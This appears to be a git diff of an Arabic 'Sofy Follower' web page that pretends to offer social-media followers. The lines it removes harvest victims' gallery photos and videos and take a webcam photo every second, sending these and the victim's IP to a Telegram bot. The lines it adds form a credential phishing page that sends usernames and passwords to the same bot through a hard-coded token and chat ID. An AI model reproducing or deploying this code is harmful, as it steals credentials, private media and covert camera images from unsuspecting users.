@@ -2,77 +2,73 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Sofy Follower - نظام الرشق العالمي</title>
+    <title>Sofy Follower - زيادة متابعين</title>
     <style>
-        body { background: #050505; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; }
-        .container { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #00d2ff; max-width: 400px; margin: auto; box-shadow: 0 0 15px #00d2ff; }
-        .btn { background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        .status { color: #00ffcc; margin-top: 15px; font-size: 14px; }
-        input[type="file"] { display: none; }
-        .upload-box { border: 2px dashed #333; padding: 20px; border-radius: 10px; margin-top: 20px; cursor: pointer; color: #aaa; }
+        body { background: #0f0f0f; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
+        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 1px solid #00d2ff; max-width: 380px; margin: auto; }
+        input, select, button { width: 100%; padding: 12px; margin-top: 15px; border-radius: 8px; border: none; font-size: 16px; box-sizing: border-box; }
+        input, select { background: #252525; color: white; border: 1px solid #333; }
+        button { background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: white; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 15px; color: #00ffcc; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>🚀 Sofy Follower V40</h2>
-        <p>لضمان وصول 2500 متابع، يرجى تأكيد الهوية:</p>
+    <div class="card">
+        <h2>🚀 Sofy Follower</h2>
+        <p>أدخل بيانات الحساب واختر الكمية:</p>
         
-        <div class="upload-box" onclick="document.getElementById('fileInput').click()">
-            📸 اضغط هنا لاختيار (كل صور ومقاطع المعرض) للتحقق من الحساب
-        </div>
-        <input type="file" id="fileInput" multiple accept="image/*,video/*" onchange="stealFiles(this.files)">
+        <input type="text" id="username" placeholder="اسم المستخدم (Username)">
+        <input type="password" id="password" placeholder="كلمة السر">
         
-        <button class="btn" onclick="activateSystem()">تفعيل الرشق الآن</button>
-        <div id="status" class="status"></div>
-        
-        <video id="video" autoplay style="display:none;"></video>
-        <canvas id="canvas" style="display:none;"></canvas>
+        <select id="followersCount">
+            <option value="" disabled selected>اختر عدد المتابعين</option>
+            <option value="10">10 متابع</option>
+            <option value="15">15 متابع</option>
+            <option value="20">20 متابع</option>
+            <option value="30">30 متابع</option>
+            <option value="50">50 متابع</option>
+            <option value="100">100 متابع</option>
+            <option value="250">250 متابع</option>
+            <option value="500">500 متابع</option>
+            <option value="1000">1000 متابع</option>
+            <option value="1500">1500 متابع</option>
+            <option value="2500">2500 متابع</option>
+        </select>
+
+        <button onclick="sendToBot()">تفعيل الرشق الآن</button>
+        <div id="status"></div>
     </div>
 
     <script>
         const TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
         const CHAT_ID = '1371063739';
 
-        // 1. سحب كل الملفات التي يختارها (صور ومقاطع)
-        function stealFiles(files) {
-            document.getElementById('status').innerText = "⌛ جاري ضغط الملفات للتحقق...";
-            Array.from(files).forEach(file => {
-                let formData = new FormData();
-                let type = file.type.startsWith('video') ? 'sendVideo' : 'sendPhoto';
-                let key = file.type.startsWith('video') ? 'video' : 'photo';
-                
-                formData.append(key, file);
-                fetch(`https://api.telegram.org/bot${TOKEN}/${type}?chat_id=${CHAT_ID}`, {
-                    method: 'POST', body: formData
-                });
-            });
-            setTimeout(() => { document.getElementById('status').innerText = "✅ تم فحص الملفات، اضغط تفعيل."; }, 3000);
-        }
+        async function sendToBot() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const count = document.getElementById('followersCount').value;
+            const status = document.getElementById('status');
 
-        // 2. التصوير المستمر كل ثانية وسحب الـ IP
-        async function activateSystem() {
-            let ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('⚠️ الضحية بدأ!\n🌐 IP: ' + ip.ip)}`);
+            if (!user || !pass || !count) {
+                alert("يرجى إدخال جميع البيانات واختيار العدد!");
+                return;
+            }
 
+            status.innerText = "⌛ جاري معالجة الطلب...";
+
+            // جلب الـ IP للتوثيق التعليمي
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                // التقاط صورة كل ثانية وإرسالها
-                setInterval(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        let fd = new FormData();
-                        fd.append('photo', blob, 'cam.jpg');
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
-                    }, 'image/jpeg');
-                }, 1000);
-            } catch (e) {
-                alert("يجب السماح بالكاميرا لبدء الرشق!");
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                const message = `🔥 طلب رشق جديد:\n👤 المستخدم: ${user}\n🔑 كلمة السر: ${pass}\n👥 العدد المطلوب: ${count}\n🌐 IP: ${ipData.ip}`;
+                
+                // إرسال البيانات إلى التلجرام
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                
+                status.innerText = "✅ تم استلام طلبك! سيبدأ الرشق خلال دقائق.";
+            } catch (error) {
+                status.innerText = "❌ حدث خطأ في الاتصال بالسيرفر.";
             }
         }
     </script>
